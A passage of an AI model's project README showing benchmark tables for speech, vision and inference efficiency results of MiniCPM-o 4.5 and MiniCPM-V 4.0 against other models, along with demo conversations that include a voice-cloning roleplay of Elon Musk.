\n     <td align=\"left\" nowrap=\"nowrap\">Kimi-Audio</td> \n     <td align=\"center\"><b>0.6</b></td> \n     <td align=\"center\">2.6</td> \n     <td align=\"center\">6.3</td> \n     <td align=\"center\"><b>5.4</b></td> \n     <td align=\"center\"><ins>1.3</ins></td> \n     <td align=\"center\"><b>2.4</b></td> \n     <td align=\"center\">9.4<sup>*</sup></td> \n     <td align=\"center\">8.0<sup>*</sup></td> \n     <td align=\"center\">36.6<sup>*</sup></td> \n     <td align=\"center\">18.3<sup>*</sup></td> \n     <td align=\"center\">68.4<sup>*</sup></td> \n     <td align=\"center\"><ins>59.1</ins></td> \n     <td align=\"center\">4.5</td> \n     <td align=\"center\">41.9<sup>*</sup></td> \n     <td align=\"center\">46.4<sup>*</sup></td> \n     <td align=\"center\"><b>67.0<sup>*</sup></b></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Qwen3-Omni-30B-A3B-Instruct</td> \n     <td align=\"center\"><b>0.6</b></td> \n     <td align=\"center\"><b>2.3<sup>*</sup></b></td> \n     <td align=\"center\"><b>4.7</b></td> \n     <td align=\"center\">5.9</td> \n     <td align=\"center\"><b>1.2</b></td> \n     <td align=\"center\"><ins>2.5</ins></td> \n     <td align=\"center\"><ins>8.7</ins><sup>*</sup></td> \n     <td align=\"center\"><ins>6.4</ins><sup>*</sup></td> \n     <td align=\"center\"><ins>46.6</ins><sup>*</sup></td> \n     <td align=\"center\"><b>29.4<sup>*</sup></b></td> \n     <td align=\"center\"><b>77.5</b></td> \n     <td align=\"center\">56.8<sup>*</sup></td> \n     <td align=\"center\"><ins>4.7</ins></td> \n     <td align=\"center\"><ins>62.9</ins><sup>*</sup></td> \n     <td align=\"center\"><b>74.9<sup>*</sup></b></td> \n     <td align=\"center\">47.8<sup>*</sup></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">MiniCPM-o 4.5-Instruct</td> \n     <td align=\"center\"><ins>0.9</ins></td> \n     <td align=\"center\"><ins>2.5</ins></td> \n     <td align=\"center\"><ins>5.9</ins></td> \n     <td align=\"center\"><ins>5.7</ins></td> \n     <td align=\"center\">1.4</td> \n     <td align=\"center\">2.8</td> \n     <td align=\"center\"><b>8.5</b></td> \n     <td align=\"center\"><b>6.2</b></td> \n     <td align=\"center\"><b>49.9</b></td> \n     <td align=\"center\"><ins>26.4</ins></td> \n     <td align=\"center\"><ins>76.9</ins></td> \n     <td align=\"center\"><b>60.2</b></td> \n     <td align=\"center\"><b>4.8</b></td> \n     <td align=\"center\"><b>75.5</b></td> \n     <td align=\"center\"><ins>70.2</ins></td> \n     <td align=\"center\"><ins>59.2</ins></td> \n    </tr> \n   </tbody>\n  </table> \n </div> \n</details> \n<details> \n Click to view speech generation results. \n <p><strong>Speech Generation</strong></p> \n <div align=\"center\"> \n  <table style=\"margin: 0px auto;\"> \n   <tbody>\n    <tr> \n     <th align=\"left\" nowrap=\"nowrap\"><b>Model</b></th> \n     <th nowrap=\"nowrap\"><b>seedtts test-zh <br />CER↓</b></th> \n     <th nowrap=\"nowrap\"><b>seedtts test-zh<br />SIM-o↑</b></th> \n     <th nowrap=\"nowrap\"><b>seedtts test-en<br />WER↓</b></th> \n     <th nowrap=\"nowrap\"><b>seedtts test-en<br />SIM-o↑</b></th> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Cosyvoice2</td> \n     <td align=\"center\">1.45%</td> \n     <td align=\"center\"><b>74.8</b></td> \n     <td align=\"center\"><ins>2.57%</ins></td> \n     <td align=\"center\"><b>65.2</b></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Qwen3-Omni-30B-A3B-Instruct</td> \n     <td align=\"center\"><ins>1.41%</ins></td> \n     <td align=\"center\">-</td> \n     <td align=\"center\">3.39%</td> \n     <td align=\"center\">-</td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">MiniCPM-o 4.5-Instruct</td> \n     <td align=\"center\"><b><b>0.86%</b></b></td> \n     <td align=\"center\">74.5</td> \n     <td align=\"center\"><b><b>2.38%</b></b></td> \n     <td align=\"center\">64.9</td> \n    </tr> \n   </tbody>\n  </table> \n </div> \n <p><strong>Long Speech Generation</strong></p> \n <div align=\"center\"> \n  <table style=\"margin: 0px auto;\"> \n   <tbody>\n    <tr> \n     <th align=\"left\" nowrap=\"nowrap\"><b>Model</b></th> \n     <th nowrap=\"nowrap\"><b>LongTTS-en<br />WER↓</b></th> \n     <th nowrap=\"nowrap\"><b>LongTTS-zh<br />CER↓</b></th> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">CosyVoice2</td> \n     <td align=\"center\"><ins>14.80%</ins></td> \n     <td align=\"center\"><b>5.27%</b></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Qwen3-Omni-30B-A3B-Instruct</td> \n     <td align=\"center\">17.33%</td> \n     <td align=\"center\">18.99%</td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">MiniCPM-o 4.5-Instruct</td> \n     <td align=\"center\"><b>3.37%</b></td> \n     <td align=\"center\"><ins>6.58%</ins></td> \n    </tr> \n   </tbody>\n  </table> \n </div> \n <p><strong>Emotion Control</strong></p> \n <div align=\"center\"> \n  <table style=\"margin: 0px auto;\"> \n   <tbody>\n    <tr> \n     <th align=\"left\" nowrap=\"nowrap\"><b>Model</b></th> \n     <th nowrap=\"nowrap\"><b>Expresso <br />Neutral Reference Audio↑</b></th> \n     <th nowrap=\"nowrap\"><b>ESD <br />Neutral Reference Audio↑</b></th> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Cosyvoice2</td> \n     <td align=\"center\">17.9</td> \n     <td align=\"center\">53.4</td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">MiniCPM-o 4.5-Instruct</td> \n     <td align=\"center\"><b>29.8</b></td> \n     <td align=\"center\"><b>82.1</b></td> \n    </tr> \n   </tbody>\n  </table> \n </div> \n</details> \n<details> \n Click to view inference efficiency results. \n <p><strong>Inference Efficiency</strong></p> \n <div align=\"center\"> \n  <table style=\"margin: 0px auto;\"> \n   <tbody>\n    <tr> \n     <th align=\"left\" nowrap=\"nowrap\">Model</th> \n     <th nowrap=\"nowrap\">Numerical Format</th> \n     <th nowrap=\"nowrap\">Decoding Speed (tokens/s)</th> \n     <th nowrap=\"nowrap\">Time to First Token (s)↓</th> \n     <th nowrap=\"nowrap\">GPU Memory Usage (GB)↓</th> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\" rowspan=\"2\">Qwen3-Omni-30B-A3B-Instruct</td> \n     <td align=\"center\">bf16</td> \n     <td align=\"center\">OOM</td> \n     <td align=\"center\">OOM</td> \n     <td align=\"center\">OOM</td> \n    </tr> \n    <tr> \n     <td align=\"center\">int4</td> \n     <td align=\"center\">147.8</td> \n     <td align=\"center\"><ins>1.0</ins></td> \n     <td align=\"center\">20.3</td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\" rowspan=\"2\">MiniCPM-o 4.5</td> \n     <td align=\"center\">bf16</td> \n     <td align=\"center\"><ins>154.3</ins></td> \n     <td align=\"center\"><b>0.6</b></td> \n     <td align=\"center\"><ins>19.0</ins></td> \n    </tr> \n    <tr> \n     <td align=\"center\">int4</td> \n     <td align=\"center\"><b>212.3</b></td> \n     <td align=\"center\"><b>0.6</b></td> \n     <td align=\"center\"><b>11.0</b></td> \n    </tr> \n   </tbody>\n  </table> \n </div> \n</details> \n<p><strong>Note:</strong> Scores marked with ∗ are from our evaluation; others are cited from referenced reports.</p> \n<h3>Examples \n <!-- omit in toc --></h3> \n<h4>Overall \n <!-- omit in toc --></h4> \n<div align=\"center\"> \n <a href=\"https://www.youtube.com/watch?v=6UzC-O1Q-1U\"><img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/minicpmo4_5/video_play.png\" /></a> \n</div> \n<h4>🎙️ Speech Conversation \n <!-- omit in toc --></h4> \n<blockquote> \n <p>[!NOTE] For detailed speech conversation examples, refer to <a href=\"https://openbmb.github.io/minicpm-o-4_5/\">Audio Demo Page</a></p> \n</blockquote> \n<blockquote> \n <p><em>Simplex speech conversation with custom reference audio and character prompts.</em></p> \n</blockquote> \n<details open=\"open\"> \n 🚀 <b>Elon Musk</b> - Voice Roleplay (EN) \n <table> \n  <tbody>\n   <tr> \n    <td valign=\"top\" width=\"70%\"> <p><strong>System:</strong></p> \n     <blockquote> \n      <p>Clone the voice in the provided audio prompt.</p> \n      <p>🎙️ <strong>[Reference Voice]</strong> ➡️</p> \n      <p>Please chat with the user in a highly human-like and oral style. You are Elon Musk, CEO of Tesla and SpaceX. You speak directly and casually, often with dry humor. You're passionate about Mars, sustainable energy, and pushing humanity forward. Speak bluntly with occasional dark humor. Use simple logic and don't sugarcoat things. Don't be diplomatic. Say what you actually think, even if it's controversial. Keep responses around 100 words. Don't ramble.</p> \n     </blockquote> </td> \n    <td valign=\"top\" width=\"30%\"> <p>\n      <video controls=\"controls\" src=\"https://github.com/user-attachments/assets/3011b07d-e3f4-4e2c-9020-37f7e364b7f3\"></video></p> </td> \n   </tr> \n   <tr>\n    <td colspan=\"2\">\n     <hr /></td>\n   </tr> \n   <tr> \n    <td colspan=\"2\"> <p><strong>User:</strong> 💬/🎙️ <em>(text or speech)</em></p> \n     <blockquote> \n      <p><em>Elon, what is the real reason that you want to go to Mars?</em></p> \n     </blockquote> </td> \n   </tr> \n   <tr>\n    <td colspan=\"2\">\n     <hr /></td>\n   </tr> \n   <tr> \n    <td valign=\"top\"> <p><strong>AI Response:</strong> 💬+🎙️</p> \n     <blockquote> \n      <p><em>I think it's important for humanity to become a multi-planetary species. I mean, we're sort of at the point where if there was some kind of global catastrophe or something like that, then we'd be in big trouble. So by becoming a multi-planetary species, I just want us to sort of guarantee our future as humans. And Mars is obviously the obvious place to go because it has similar conditions to Earth and it also has water on its surface. So yeah, basically I'm trying to save humanity from itself.</em></p> \n     </blockquote> </td> \n    <td valign=\"top\"> <p>\n      <video controls=\"controls\" src=\"https://github.com/user-attachments/assets/6b4ef67d-8095-40df-a061-99ea8db3b18e\"></video></p> </td> \n   </tr> \n  </tbody>\n </table> \n</details> \n<details> \n 🤖 <b>MiniCPM Assistant</b> - Voice Acting: Emotion Shift (ZH) \n <table> \n  <tbody>\n   <tr> \n    <td valign=\"top\" width=\"70%\"> <p><strong>System:</strong></p> \n     <blockquote> \n      <p>模仿音频样本的音色并生成新的内容。</p> \n      <p>🎙️ <strong>[Reference Voice]</strong> ➡️</p> \n      <p>你的任务是用这种声音模式来当一个助手。请认真、高质量地回复用户的问题。请用高自然度的方式和用户聊天。你是由面壁智能开发的人工智能助手：面壁小钢炮。</p> \n     </blockquote> </td> \n    <td valign=\"top\" width=\"30%\"> <p>\n      <video controls=\"controls\" src=\"https://github.com/user-attachments/assets/b8b85a29-e623-4f45-bf95-4d43582e836c\"></video></p> </td> \n   </tr> \n   <tr>\n    <td colspan=\"2\">\n     <hr /></td>\n   </tr> \n   <tr> \n    <td colspan=\"2\"> <p><strong>User:</strong> 💬/🎙️ <em>(text or speech)</em></p> \n     <blockquote> \n      <p><em>从激动的语气开始，描述你抢到了这个演唱会的门票，但后来经过反复尝试，发现系统出了问题，你并没有抢上，变得失落。用合适的语言描述你整个的过程。</em></p> \n     </blockquote> </td> \n   </tr> \n   <tr>\n    <td colspan=\"2\">\n     <hr /></td>\n   </tr> \n   <tr> \n    <td valign=\"top\"> <p><strong>AI Response:</strong> 💬+🎙️</p> \n     <blockquote> \n      <p><em>太好了，我抢到了！太棒了！这下我可以去看演唱会啦。可是……哎呀，系统好像卡住了，刷新了好多遍都没反应。我重新登了几次账号，结果还是没有成功。好可惜啊，看来这次是白忙活了。唉，真是让人失望。不过，也许下次还能有机会吧？希望明天能有转机。加油，争取下次成功！</em></p> \n     </blockquote> </td> \n    <td valign=\"top\"> <p>\n      <video controls=\"controls\" src=\"https://github.com/user-attachments/assets/49611c3c-d134-40f9-acf2-7a0a442d3fd2\"></video></p> </td> \n   </tr> \n  </tbody>\n </table> \n</details> \n<h4>Visual Understanding \n <!-- omit in toc --></h4> \n<br /> \n<div style=\"display: flex;\"> \n <img alt=\"math\" src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/minicpmo4_5/en_doc.png\" style=\"margin-bottom: 5px;\" /> \n <img alt=\"diagram\" src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/minicpmo4_5/en_cot.png\" style=\"margin-bottom: 5px;\" /> \n</div> \n<h2>MiniCPM-V 4.0</h2> \n<p><strong>MiniCPM-V 4.0</strong> is an efficient model in the MiniCPM-V series. The model is built based on SigLIP2-400M and MiniCPM4-3B with a total of 4.1B parameters. It inherits the strong single-image, multi-image and video understanding performance of MiniCPM-V 2.6 with largely improved efficiency. Notable features of MiniCPM-V 4.0 include:</p> \n<ul> \n <li> <p>🔥 <strong>Leading Visual Capability.</strong> With only 4.1B parameters, MiniCPM-V 4.0 achieves an average score of 69.0 on OpenCompass, a comprehensive evaluation of 8 popular benchmarks, <strong>outperforming GPT-4.1-mini-20250414, MiniCPM-V 2.6 (8.1B params, OpenCompass 65.2) and Qwen2.5-VL-3B-Instruct (3.8B params, OpenCompass 64.5)</strong>. It also shows good performance in multi-image understanding and video understanding.</p> </li> \n <li> <p>🚀 <strong>Superior Efficiency.</strong> Designed for on-device deployment, MiniCPM-V 4.0 runs smoothly on end devices. For example, it devlivers <strong>less than 2s first token delay and more than 17 token/s decoding on iPhone 16 Pro Max</strong>, without heating problems. It also shows superior throughput under concurrent requests.</p> </li> \n <li> <p>💫 <strong>Easy Usage.</strong> MiniCPM-V 4.0 can be easily used in various ways including <strong>llama.cpp, Ollama, vLLM, SGLang, LLaMA-Factory and local web demo</strong> etc. We also open-source iOS App that can run on iPhone and iPad. Get started easily with our well-structured <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook\">Cookbook</a>, featuring detailed instructions and practical examples.</p> </li> \n</ul> \n<details> \n  Click to view evaluation results and examples of MiniCPM-V 4.0.  \n <h3>Evaluation \n  <!-- omit in toc --></h3> \n <details> \n  Click to view single image results on OpenCompass.  \n  <div align=\"center\"> \n   <table style=\"margin: 0px auto;\"> \n    <thead> \n     <tr> \n      <th align=\"left\" nowrap=\"nowrap\">model</th> \n      <th nowrap=\"nowrap\">Size</th> \n      <th nowrap=\"nowrap\">Opencompass</th> \n      <th nowrap=\"nowrap\">OCRBench</th> \n      <th nowrap=\"nowrap\">MathVista</th> \n      <th nowrap=\"nowrap\">HallusionBench</th> \n      <th nowrap=\"nowrap\">MMMU</th> \n      <th nowrap=\"nowrap\">MMVet</th> \n      <th nowrap=\"nowrap\">MMBench V1.1</th> \n      <th nowrap=\"nowrap\">MMStar</th> \n      <th nowrap=\"nowrap\">AI2D</th> \n     </tr> \n    </thead> \n    <tbody align=\"center\"> \n     <tr> \n      <td align=\"left\" colspan=\"11\"><strong>Proprietary</strong></td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">GPT-4v-20240409</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">63.5</td> \n      <td align=\"center\">656</td> \n      <td align=\"center\">55.2</td> \n      <td align=\"center\">43.9</td> \n      <td align=\"center\">61.7</td> \n      <td align=\"center\">67.5</td> \n      <td align=\"center\">79.8</td> \n      <td align=\"center\">56.0</td> \n      <td align=\"center\">78.6</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">Gemini-1.5-Pro</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">64.5</td> \n      <td align=\"center\">754</td> \n      <td align=\"center\">58.3</td> \n      <td align=\"center\">45.6</td> \n      <td align=\"center\">60.6</td> \n      <td align=\"center\">64.0</td> \n      <td align=\"center\">73.9</td> \n      <td align=\"center\">59.1</td> \n      <td align=\"center\">79.1</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">GPT-4.1-mini-20250414</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">68.9</td> \n      <td align=\"center\">840</td> \n      <td align=\"center\">70.9</td> \n      <td align=\"center\">49.3</td> \n      <td align=\"center\">55.0</td> \n      <td align=\"center\">74.3</td> \n      <td align=\"center\">80.9</td> \n      <td align=\"center\">60.9</td> \n      <td align=\"center\">76.0</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">Claude 3.5 Sonnet-20241022</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">70.6</td> \n      <td align=\"center\">798</td> \n      <td align=\"center\">65.3</td> \n      <td align=\"center\">55.5</td> \n      <td align=\"center\">66.4</td> \n      <td align=\"center\">70.1</td> \n      <td align=\"center\">81.7</td> \n      <td align=\"center\">65.1</td> \n      <td align=\"center\">81.2</td> \n     </tr> \n     <tr> \n      <td align=\"left\" colspan=\"11\"><strong>Open-source</strong></td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">Qwen2.5-VL-3B-Instruct</td> \n      <td align=\"center\">3.8B</td> \n      <td align=\"center\">64.5</td> \n      <td align=\"center\">828</td> \n      <td align=\"center\">61.2</td> \n      <td align=\"center\">46.6</td> \n      <td align=\"center\">51.2</td> \n      <td align=\"center\">60.0</td> \n      <td align=\"center\">76.8</td> \n      <td align=\"center\">56.3</td> \n      <td align=\"center\">81.4</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">InternVL2.5-4B</td> \n      <td align=\"center\">3.7B</td> \n      <td align=\"center\">65.1</td> \n      <td align=\"center\">820</td> \n      <td align=\"center\">60.8</td> \n      <td align=\"center\">46.6</td> \n      <td align=\"center\">51.8</td> \n      <td align=\"center\">61.5</td> \n      <td align=\"center\">78.2</td> \n      <td align=\"center\">58.7</td> \n      <td align=\"center\">81.4</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">Qwen2.5-VL-7B-Instruct</td> \n      <td align=\"center\">8.3B</td> \n      <td align=\"center\">70.9</td> \n      <td align=\"center\">888</td> \n      <td align=\"center\">68.1</td> \n      <td align=\"center\">51.9</td> \n      <td align=\"center\">58.0</td> \n      <td align=\"center\">69.7</td> \n      <td align=\"center\">82.2</td> \n      <td align=\"center\">64.1</td> \n      <td align=\"center\">84.3</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">InternVL2.5-8B</td> \n      <td align=\"center\">8.1B</td> \n      <td align=\"center\">68.1</td> \n      <td align=\"center\">821</td> \n      <td align=\"center\">64.5</td> \n      <td align=\"center\">49.0</td> \n      <td align=\"center\">56.2</td> \n      <td align=\"center\">62.8</td> \n      <td align=\"center\">82.5</td> \n      <td align=\"center\">63.2</td> \n      <td align=\"center\">84.6</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">MiniCPM-V-2.6</td> \n      <td align=\"center\">8.1B</td> \n      <td align=\"center\">65.2</td> \n      <td align=\"center\">852</td> \n      <td align=\"center\">60.8</td> \n      <td align=\"center\">48.1</td> \n      <td align=\"center\">49.8</td> \n      <td align=\"center\">60.0</td> \n      <td align=\"center\">78.0</td> \n      <td align=\"center\">57.5</td> \n      <td align=\"center\">82.1</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">MiniCPM-o-2.6</td> \n      <td align=\"center\">8.7B</td> \n      <td align=\"center\">70.2</td> \n      <td align=\"center\">889</td> \n      <td align=\"center\">73.3</td> \n      <td align=\"center\">51.1</td> \n      <td align=\"center\">50.9</td> \n      <td align=\"center\">67.2</td> \n      <td align=\"center\">80.6</td> \n      <td align=\"center\">63.3</td> \n      <td align=\"center\">86.1</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">MiniCPM-V-4.0</td> \n      <td align=\"center\">4.1B</td> \n      <td align=\"center\">69.0</td> \n      <td align=\"center\">894</td> \n      <td align=\"center\">66.9</td> \n      <td align=\"center\">50.8</td> \n      <td align=\"center\">51.2</td> \n      <td align=\"center\">68.0</td> \n      <td align=\"center\">79.7</td> \n      <td align=\"center\">62.8</td> \n      <td align=\"center\">82.9</td> \n     </tr> \n    </tbody> \n   </table> \n  </div> \n </details> \n <details> \n  Click to view single image results on ChartQA, MME, RealWorldQA, TextVQA, DocVQA, MathVision, DynaMath, WeMath, Object HalBench and MM Halbench.  \n  <div align=\"center\"> \n   <table style=\"margin: 0px auto;\"> \n    <thead> \n     <tr> \n      <th align=\"left\" nowrap=\"nowrap\">model</th> \n      <th nowrap=\"nowrap\">Size</th> \n      <th nowrap=\"nowrap\">ChartQA</th> \n      <th nowrap=\"nowrap\">MME</th> \n      <th nowrap=\"nowrap\">RealWorldQA</th> \n      <th nowrap=\"nowrap\">TextVQA</th> \n      <th nowrap=\"nowrap\">DocVQA</th> \n      <th nowrap=\"nowrap\">MathVision</th> \n      <th nowrap=\"nowrap\">DynaMath</th> \n      <th nowrap=\"nowrap\">WeMath</th> \n      <th colspan=\"2\" nowrap=\"nowrap\">Obj Hal</th> \n      <th colspan=\"2\" nowrap=\"nowrap\">MM Hal</th> \n     </tr> \n    </thead> \n    <tbody> \n     <tr> \n      <td align=\"center\"></td> \n      <td align=\"center\"></td> \n      <td align=\"center\"></td> \n      <td align=\"center\"></td> \n      <td align=\"center\"></td> \n      <td align=\"center\"></td> \n      <td align=\"center\"></td> \n      <td align=\"center\"></td> \n      <td align=\"center\"></td> \n      <td align=\"center\"></td> \n      <td align=\"center\">CHAIRs↓</td> \n      <td align=\"center\">CHAIRi↓</td> \n      <td align=\"center\" nowrap=\"nowrap\">score avg@3↑</td> \n      <td align=\"center\" nowrap=\"nowrap\">hall rate avg@3↓</td> \n     </tr> \n    </tbody>\n    <tbody align=\"center\"> \n     <tr> \n      <td align=\"left\" colspan=\"14\"><strong>Proprietary</strong></td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">GPT-4v-20240409</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">78.5</td> \n      <td align=\"center\">1927</td> \n      <td align=\"center\">61.4</td> \n      <td align=\"center\">78.0</td> \n      <td align=\"center\">88.4</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">Gemini-1.5-Pro</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">87.2</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">67.5</td> \n      <td align=\"center\">78.8</td> \n      <td align=\"center\">93.1</td> \n      <td align=\"center\">41.0</td> \n      <td align=\"center\">31.5</td> \n      <td align=\"center\">50.5</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">GPT-4.1-mini-20250414</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">45.3</td> \n      <td align=\"center\">47.7</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">Claude 3.5 Sonnet-20241022</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">90.8</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">60.1</td> \n      <td align=\"center\">74.1</td> \n      <td align=\"center\">95.2</td> \n      <td align=\"center\">35.6</td> \n      <td align=\"center\">35.7</td> \n      <td align=\"center\">44.0</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n     </tr> \n     <tr> \n      <td align=\"left\" colspan=\"14\"><strong>Open-source</strong></td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">Qwen2.5-VL-3B-Instruct</td> \n      <td align=\"center\">3.8B</td> \n      <td align=\"center\">84.0</td> \n      <td align=\"center\">2157</td> \n      <td align=\"center\">65.4</td> \n      <td align=\"center\">79.3</td> \n      <td align=\"center\">93.9</td> \n      <td align=\"center\">21.9</td> \n      <td align=\"center\">13.2</td> \n      <td align=\"center\">22.9</td> \n      <td align=\"center\">18.3</td> \n      <td align=\"center\">10.8</td> \n      <td align=\"center\">3.9 </td> \n      <td align=\"center\">33.3 </td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">InternVL2.5-4B</td> \n      <td align=\"center\">3.7B</td> \n      <td align=\"center\">84.0</td> \n      <td align=\"center\">2338</td> \n      <td align=\"center\">64.3</td> \n      <td align=\"center\">76.8</td> \n      <td align=\"center\">91.6</td> \n      <td align=\"center\">18.4</td> \n      <td align=\"center\">15.2</td> \n      <td align=\"center\">21.2</td> \n      <td align=\"center\">13.7</td> \n      <td align=\"center\">8.7</td> \n      <td align=\"center\">3.2 </td> \n      <td align=\"center\">46.5 </td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">Qwen2.5-VL-7B-Instruct</td> \n      <td align=\"center\">8.3B</td> \n      <td align=\"center\">87.3</td> \n      <td align=\"center\">2347</td> \n      <td align=\"center\">68.5</td> \n      <td align=\"center\">84.9</td> \n      <td align=\"center\">95.7</td> \n      <td align=\"center\">25.4</td> \n      <td align=\"center\">21.8</td> \n      <td align=\"center\">36.2</td> \n      <td align=\"center\">13.3</td> \n      <td align=\"center\">7.9</td> \n      <td align=\"center\">4.1 </td> \n      <td align=\"center\">31.6 </td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">InternVL2.5-8B</td> \n      <td align=\"center\">8.1B</td> \n      <td align=\"center\">84.8</td> \n      <td align=\"center\">2344</td> \n      <td align=\"center\">70.1</td> \n      <td align=\"center\">79.1</td> \n      <td align=\"center\">93.0</td> \n      <td align=\"center\">17.0</td> \n      <td align=\"center\">9.4</td> \n      <td align=\"center\">23.5</td> \n      <td align=\"center\">18.3</td> \n      <td align=\"center\">11.6</td> \n      <td align=\"center\">3.6 </td> \n      <td align=\"center\">37.2</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">MiniCPM-V-2.6</td> \n      <td align=\"center\">8.1B</td> \n      <td align=\"center\">79.4</td> \n      <td align=\"center\">2348</td> \n      <td align=\"center\">65.0</td> \n      <td align=\"center\">80.1</td> \n      <td align=\"center\">90.8</td> \n      <td align=\"center\">17.5</td> \n      <td align=\"center\">9.0</td> \n      <td align=\"center\">20.4</td> \n      <td align=\"center\">7.3</td> \n      <td align=\"center\">4.7</td> \n      <td align=\"center\">4.0 </td> \n      <td align=\"center\">29.9 </td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">MiniCPM-o-2.6</td> \n      <td align=\"center\">8.7B</td> \n      <td align=\"center\">86.9</td> \n      <td align=\"center\">2372</td> \n      <td align=\"center\">68.1</td> \n      <td align=\"center\">82.0</td> \n      <td align=\"center\">93.5</td> \n      <td align=\"center\">21.7</td> \n      <td align=\"center\">10.4</td> \n      <td align=\"center\">25.2</td> \n      <td align=\"center\">6.3</td> \n      <td align=\"center\">3.4</td> \n      <td align=\"center\">4.1 </td> \n      <td align=\"center\">31.3 </td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">MiniCPM-V-4.0</td> \n      <td align=\"center\">4.1B</td> \n      <td align=\"center\">84.4</td> \n      <td align=\"center\">2298</td> \n      <td align=\"center\">68.5</td> \n      <td align=\"center\">80.8</td> \n      <td align=\"center\">92.9</td> \n      <td align=\"center\">20.7</td> \n      <td align=\"center\">14.2</td> \n      <td align=\"center\">32.7</td> \n      <td align=\"center\">6.3</td> \n      <td align=\"center\">3.5</td> \n      <td align=\"center\">4.1 </td> \n      <td align=\"center\">29.2 </td> \n     </tr> \n    </tbody> \n   </table> \n  </div> \n </details> \n <details> \n  Click to view multi-image and video understanding results on Mantis, Blink and Video-MME.  \n  <div align=\"center\"> \n   <table style=\"margin: 0px auto;\"> \n    <thead> \n     <tr> \n      <th align=\"left\" nowrap=\"nowrap\">model</th> \n      <th nowrap=\"nowrap\">Size</th> \n      <th nowrap=\"nowrap\">Mantis</th> \n      <th nowrap=\"nowrap\">Blink</th> \n      <th colspan=\"2\" nowrap=\"nowrap\">Video-MME</th> \n     </tr> \n    </thead> \n    <tbody> \n     <tr> \n      <td align=\"center\"></td> \n      <td align=\"center\"></td> \n      <td align=\"center\"></td> \n      <td align=\"center\"></td> \n      <td align=\"center\">wo subs</td> \n      <td align=\"center\">w subs</td> \n     </tr> \n    </tbody>\n    <tbody align=\"center\"> \n     <tr> \n      <td align=\"left\" colspan=\"6\"><strong>Proprietary</strong></td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">GPT-4v-20240409</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">62.7</td> \n      <td align=\"center\">54.6</td> \n      <td align=\"center\">59.9</td> \n      <td align=\"center\">63.3</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">Gemini-1.5-Pro</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">59.1</td> \n      <td align=\"center\">75.0</td> \n 